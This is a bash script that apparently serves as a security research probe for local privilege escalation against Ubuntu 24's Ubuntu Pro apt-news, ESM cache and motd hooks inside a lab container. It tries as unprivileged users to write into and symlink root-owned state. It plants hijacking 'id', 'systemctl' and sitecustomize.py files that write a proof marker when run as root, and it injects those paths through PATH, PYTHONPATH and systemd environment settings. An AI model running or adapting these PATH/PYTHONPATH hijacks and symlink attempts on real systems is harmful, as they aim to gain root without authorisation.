#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"
SELFAUTH="${SELFAUTH:-selfauth}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/ubuntu-pro-apt-news.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

target_root() {
  run docker exec "$TARGET" bash -lc "$1"
}

as_user() {
  local user="$1"
  local cmd="$2"
  run docker exec "$TARGET" runuser -u "$user" -- bash -lc "$cmd"
}

echo "Ubuntu Pro apt-news/apt hook probe"
echo "target=$TARGET attacker=$ATTACKER selfauth=$SELFAUTH"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

target_root '
set +e
echo "== cleanup before probe =="
rm -rf /tmp/ubuntu_pro_apt_news_probe* /tmp/ubuntu_pro_apt_news_* \
  /home/attacker/ubuntu_pro_apt_news_probe \
  /home/selfauth/ubuntu_pro_apt_news_probe 2>/dev/null || true
rm -f /root/ubuntu_pro_apt_news_lpe_proof /root/ubuntu_pro_apt_news_* 2>/dev/null || true
systemctl reset-failed apt-news.service esm-cache.service apt-daily.service \
  apt-daily-upgrade.service motd-news.service update-notifier-motd.service \
  2>/dev/null || true
'

target_root '
set -euo pipefail
echo "== target identity and default package proof =="
cat /etc/os-release
uname -a
ps -p 1 -o user=,comm=,args=
id attacker
id selfauth
echo
dpkg-query -W ubuntu-pro-client ubuntu-pro-client-l10n ubuntu-advantage-tools \
  apt update-notifier-common base-files libpam-modules login openssh-server \
  systemd unattended-upgrades 2>/dev/null || true
echo
echo "== apt/pro/motd config files =="
for f in /etc/apt/apt.conf.d/20apt-esm-hook.conf \
  /etc/apt/apt.conf.d/10periodic /etc/apt/apt.conf.d/15update-stamp \
  /etc/apt/apt.conf.d/20auto-upgrades /etc/apt/apt.conf.d/99update-notifier \
  /etc/default/motd-news /etc/update-motd.d/50-motd-news \
  /etc/update-motd.d/91-contract-ua-esm-status; do
  echo "### $f"
  if [ -e "$f" ]; then
    stat -Lc "%A %a %U:%G %n" "$f"
    nl -ba "$f" | sed -n "1,180p"
  else
    echo "MISSING $f"
  fi
done
echo
echo "== systemd units and timers =="
systemctl cat apt-news.service esm-cache.service apt-daily.service \
  apt-daily-upgrade.service motd-news.service update-notifier-motd.service \
  2>/dev/null || true
for u in apt-news.service esm-cache.service apt-daily.service apt-daily.timer \
  apt-daily-upgrade.service apt-daily-upgrade.timer motd-news.service \
  motd-news.timer update-notifier-motd.service update-notifier-motd.timer; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState \
    -p Result -p ConditionResult -p FragmentPath -p User -p Environment \
    -p PassEnvironment -p ExecStart "$u" 2>&1 || true
done
echo
echo "== pam/login reachability =="
for f in /usr/bin/login /bin/login /usr/bin/su /usr/sbin/runuser /usr/bin/runuser; do
  [ -e "$f" ] && stat -Lc "%A %a %U:%G %n" "$f" || echo "MISSING $f"
done
grep -RIn "pam_motd" /etc/pam.d || true
'

target_root '
set -euo pipefail
echo "== root-owned state and cache path modes =="
for p in /etc/apt/apt.conf.d /etc/apt/apt.conf.d/20apt-esm-hook.conf \
  /etc/ubuntu-advantage /etc/ubuntu-advantage/uaclient.conf \
  /var/lib/ubuntu-advantage /var/lib/ubuntu-advantage/user-config.json \
  /var/lib/ubuntu-advantage/status.json /var/lib/ubuntu-advantage/messages \
  /var/lib/ubuntu-advantage/messages/apt-news \
  /var/lib/ubuntu-advantage/messages/apt-news-raw \
  /var/lib/ubuntu-advantage/apt-esm \
  /run/ubuntu-advantage /run/ubuntu-advantage/apt-news \
  /run/ubuntu-advantage/apt-news/aptnews.json \
  /var/cache/motd-news /var/lib/apt/periodic \
  /var/lib/apt/periodic/update-success-stamp \
  /var/lib/apt/lists /var/lib/apt/lists/partial \
  /usr/local/bin /usr/local/sbin; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc "%A %a %U:%G %F %n -> %N" "$p"
  else
    echo "MISSING $p"
  fi
done
echo
echo "== ubuntu-pro apt-news implementation excerpts =="
echo "### /usr/lib/ubuntu-advantage/apt_news.py"
nl -ba /usr/lib/ubuntu-advantage/apt_news.py | sed -n "1,80p"
echo "### uaclient apt_news fetch/write"
nl -ba /usr/lib/python3/dist-packages/uaclient/apt_news.py | sed -n "81,140p;160,224p;265,288p"
echo "### apt_news config and paths"
nl -ba /usr/lib/python3/dist-packages/uaclient/config.py | sed -n "283,304p"
nl -ba /usr/lib/python3/dist-packages/uaclient/files/user_config_file.py | sed -n "103,158p"
nl -ba /usr/lib/python3/dist-packages/uaclient/files/state_files.py | sed -n "136,140p"
nl -ba /usr/lib/python3/dist-packages/uaclient/defaults.py | sed -n "39,58p;80,88p"
echo "### atomic write/delete helpers"
nl -ba /usr/lib/python3/dist-packages/uaclient/system.py | sed -n "600,646p"
echo "### apt stamp and ESM cache helpers"
nl -ba /usr/lib/python3/dist-packages/uaclient/apt.py | sed -n "318,328p;884,940p"
echo "### apt-esm-json-hook"
file /usr/lib/ubuntu-advantage/apt-esm-json-hook
/usr/lib/ubuntu-advantage/apt-esm-json-hook >/tmp/ubuntu_pro_apt_news_hook_root.out \
  2>/tmp/ubuntu_pro_apt_news_hook_root.err || true
printf "root hook stdout: "; sed -n "1,5p" /tmp/ubuntu_pro_apt_news_hook_root.out
printf "root hook stderr: "; sed -n "1,5p" /tmp/ubuntu_pro_apt_news_hook_root.err
rm -f /tmp/ubuntu_pro_apt_news_hook_root.out /tmp/ubuntu_pro_apt_news_hook_root.err
'

for user in "$ATTACKER" "$SELFAUTH"; do
  as_user "$user" '
set +e
echo "== user identity and Pro status =="
id
groups
pro status --format json 2>&1 | sed -n "1,80p"
pro api u.pro.status.is_attached.v1 2>&1 | sed -n "1,80p"
echo
echo "== state-changing Pro commands must not cross privilege boundary =="
for cmd in \
  "pro config set apt_news=false" \
  "pro config set apt_news_url=https://example.invalid/aptnews.json" \
  "pro refresh"; do
  echo "### $cmd"
  timeout 20s bash -lc "$cmd" 2>&1
  echo "rc=$?"
done
echo
echo "== systemd service and environment control =="
for cmd in \
  "systemctl start apt-news.service" \
  "systemctl start esm-cache.service" \
  "systemctl start apt-daily.service" \
  "systemctl set-environment PATH=/home/$(id -un)/ubuntu_pro_apt_news_probe/bin:/usr/bin" \
  "systemctl set-environment PYTHONPATH=/home/$(id -un)/ubuntu_pro_apt_news_probe/py" \
  "systemctl set-environment UA_DATA_DIR=/home/$(id -un)/ubuntu_pro_apt_news_probe/data"; do
  echo "### $cmd"
  timeout 20s bash -lc "$cmd" 2>&1
  echo "rc=$?"
done
echo
echo "== root-owned state write/symlink attempts =="
for p in \
  /etc/apt/apt.conf.d/20apt-esm-hook.conf \
  /etc/ubuntu-advantage/uaclient.conf \
  /var/lib/ubuntu-advantage/user-config.json \
  /var/lib/ubuntu-advantage/status.json \
  /var/lib/ubuntu-advantage/messages/apt-news \
  /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list \
  /run/ubuntu-advantage/apt-news/owned-by-user \
  /run/ubuntu-advantage/apt-news/aptnews.json \
  /var/cache/motd-news \
  /var/lib/apt/periodic/update-success-stamp; do
  printf "write %s -> " "$p"
  err="/tmp/ubuntu_pro_apt_news_write_$(id -un).err"
  if bash -c "printf probe > \"\$1\"" bash "$p" 2>"$err"; then
    echo OK
    rm -f "$p"
  else
    sed -n "1p" "$err"
  fi
  rm -f "$err"
done
for p in /run/ubuntu-advantage/user-link \
  /run/ubuntu-advantage/apt-news/user-link \
  /var/lib/ubuntu-advantage/messages; do
  printf "symlink %s -> " "$p"
  err="/tmp/ubuntu_pro_apt_news_link_$(id -un).err"
  if ln -s /root/ubuntu_pro_apt_news_lpe_proof "$p" 2>"$err"; then
    echo OK
    rm -f "$p"
  else
    sed -n "1p" "$err"
  fi
  rm -f "$err"
done
'

  as_user "$user" '
set +e
probe=ubuntu_pro_apt_news_probe
u="$(id -un)"
home="$HOME/$probe"
rm -rf "$home"
mkdir -p "$home/bin" "$home/py"
cat > "$home/bin/id" <<SH
#!/bin/sh
/usr/bin/id > /tmp/ubuntu_pro_apt_news_${u}_fake_id
if [ "\$(/usr/bin/id -u)" = "0" ]; then
  /usr/bin/id > /root/ubuntu_pro_apt_news_lpe_proof
fi
exec /usr/bin/id "\$@"
SH
cat > "$home/bin/systemctl" <<SH
#!/bin/sh
/usr/bin/id > /tmp/ubuntu_pro_apt_news_${u}_fake_systemctl
if [ "\$(/usr/bin/id -u)" = "0" ]; then
  /usr/bin/id > /root/ubuntu_pro_apt_news_lpe_proof
fi
exit 0
SH
cat > "$home/py/sitecustomize.py" <<PY
import os
marker = "/tmp/ubuntu_pro_apt_news_${u}_sitecustomize"
with open(marker, "a", encoding="utf-8") as fh:
    fh.write("uid=%s euid=%s argv=%r\n" % (os.getuid(), os.geteuid(), __import__("sys").argv))
if os.geteuid() == 0:
    with open("/root/ubuntu_pro_apt_news_lpe_proof", "w", encoding="utf-8") as fh:
        fh.write("python sitecustomize root execution\n")
PY
chmod 755 "$home/bin/id" "$home/bin/systemctl"
echo "== hostile PATH/PYTHONPATH direct helper execution =="
echo "helper_home=$home"
for cmd in \
  "PATH=$home/bin:\$PATH PYTHONPATH=$home/py pro status --format json" \
  "PATH=$home/bin:\$PATH PYTHONPATH=$home/py pro refresh" \
  "PATH=$home/bin:\$PATH PYTHONPATH=$home/py /usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py" \
  "PATH=$home/bin:\$PATH PYTHONPATH=$home/py /usr/lib/ubuntu-advantage/esm_cache.py" \
  "PATH=$home/bin:\$PATH CACHE=/tmp/ubuntu_pro_apt_news_${u}_motd_cache /etc/update-motd.d/50-motd-news" \
  "PATH=$home/bin:\$PATH /etc/update-motd.d/91-contract-ua-esm-status" \
  "PATH=$home/bin:\$PATH apt-get update" \
  "PATH=$home/bin:\$PATH apt -s upgrade"; do
  echo "### $cmd"
  timeout 35s bash -lc "$cmd" >/tmp/ubuntu_pro_apt_news_${u}_cmd.out \
    2>/tmp/ubuntu_pro_apt_news_${u}_cmd.err
  rc=$?
  echo "rc=$rc"
  sed -n "1,40p" /tmp/ubuntu_pro_apt_news_${u}_cmd.out
  sed -n "1,40p" /tmp/ubuntu_pro_apt_news_${u}_cmd.err
done
echo "== hostile-env markers for $u =="
for p in /tmp/ubuntu_pro_apt_news_${u}_fake_id \
  /tmp/ubuntu_pro_apt_news_${u}_fake_systemctl \
  /tmp/ubuntu_pro_apt_news_${u}_sitecustomize \
  /tmp/ubuntu_pro_apt_news_${u}_motd_cache; do
  if [ -e "$p" ]; then
    stat -Lc "%A %U:%G %n" "$p"
    sed -n "1,20p" "$p" 2>/dev/null || true
  else
    echo "MISSING $p"
  fi
done
rm -f /tmp/ubuntu_pro_apt_news_${u}_cmd.out /tmp/ubuntu_pro_apt_news_${u}_cmd.err
'
done

target_root '
set +e
echo "== root apt/update trigger with user hostile dirs present =="
echo "system manager environment before trigger:"
systemctl show-environment 2>/dev/null | grep -E "^(PATH|PYTHONPATH|UA_DATA_DIR)=" || true
timeout 45s systemctl start apt-news.service esm-cache.service 2>&1
echo "systemctl_start_rc=$?"
timeout 120s apt-get update 2>&1
echo "apt_get_update_rc=$?"
sleep 3
systemctl status --no-pager apt-news.service esm-cache.service | sed -n "1,140p"
journalctl -u apt-news.service -u esm-cache.service --no-pager -n 80 2>/dev/null || true
echo
echo "== post-root-trigger state modes =="
for p in /run/ubuntu-advantage /run/ubuntu-advantage/apt-news \
  /run/ubuntu-advantage/apt-news/aptnews.json \
  /var/lib/ubuntu-advantage /var/lib/ubuntu-advantage/status.json \
  /var/lib/ubuntu-advantage/user-config.json \
  /var/lib/ubuntu-advantage/messages \
  /var/lib/ubuntu-advantage/messages/apt-news \
  /var/lib/ubuntu-advantage/messages/apt-news-raw \
  /var/lib/ubuntu-advantage/apt-esm \
  /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list \
  /var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status \
  /var/lib/apt/periodic/update-success-stamp; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc "%A %a %U:%G %F %n -> %N" "$p"
  else
    echo "MISSING $p"
  fi
done
echo
echo "== symlink inventory under Pro state =="
find /run/ubuntu-advantage /var/lib/ubuntu-advantage -maxdepth 4 -type l -ls 2>/dev/null || true
echo
echo "== root-side PAM/login MOTD environment probe =="
if [ -d /home/attacker/ubuntu_pro_apt_news_probe ]; then
  printf "exit\n" >/tmp/ubuntu_pro_apt_news_login_input
  timeout 25s script -q -e -c "env PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PYTHONPATH=/home/attacker/ubuntu_pro_apt_news_probe/py CACHE=/tmp/ubuntu_pro_apt_news_login_cache /bin/login -p -f selfauth" /dev/null \
    </tmp/ubuntu_pro_apt_news_login_input 2>&1 | sed -n "1,90p"
  echo "login_pipe_rc=${PIPESTATUS[0]}"
fi
for p in /tmp/ubuntu_pro_apt_news_attacker_fake_id \
  /tmp/ubuntu_pro_apt_news_attacker_fake_systemctl \
  /tmp/ubuntu_pro_apt_news_attacker_sitecustomize \
  /tmp/ubuntu_pro_apt_news_login_cache \
  /root/ubuntu_pro_apt_news_lpe_proof; do
  if [ -e "$p" ]; then
    stat -Lc "%A %U:%G %n" "$p"
    sed -n "1,20p" "$p" 2>/dev/null || true
  else
    echo "MISSING $p"
  fi
done
echo
echo "== attacker write retry after root apt-news cache exists =="
runuser -u attacker -- bash -lc '"'"'
for p in /run/ubuntu-advantage/apt-news/post-root-write \
  /run/ubuntu-advantage/apt-news/aptnews.json \
  /var/lib/ubuntu-advantage/status.json \
  /var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status; do
  printf "write %s -> " "$p"
  err=/tmp/ubuntu_pro_apt_news_post_write.err
  if bash -c "printf x > \"\$1\"" bash "$p" 2>"$err"; then
    echo OK
    rm -f "$p"
  else
    sed -n "1p" "$err"
  fi
  rm -f "$err"
done
'"'"'
echo
echo "== root proof check =="
if [ -e /root/ubuntu_pro_apt_news_lpe_proof ]; then
  echo "ROOT_PROOF_PRESENT"
  stat -Lc "%A %U:%G %n" /root/ubuntu_pro_apt_news_lpe_proof
  cat /root/ubuntu_pro_apt_news_lpe_proof
else
  echo "ROOT_PROOF_ABSENT"
fi
'

target_root '
set +e
echo "== cleanup after probe =="
rm -rf /tmp/ubuntu_pro_apt_news_probe* /tmp/ubuntu_pro_apt_news_* \
  /home/attacker/ubuntu_pro_apt_news_probe \
  /home/selfauth/ubuntu_pro_apt_news_probe 2>/dev/null || true
rm -f /root/ubuntu_pro_apt_news_lpe_proof /root/ubuntu_pro_apt_news_* 2>/dev/null || true
echo "root_marker_absent_after_cleanup=$([ ! -e /root/ubuntu_pro_apt_news_lpe_proof ] && echo yes || echo no)"
systemctl is-system-running 2>&1 || true
systemctl --failed --no-pager 2>&1 || true
'
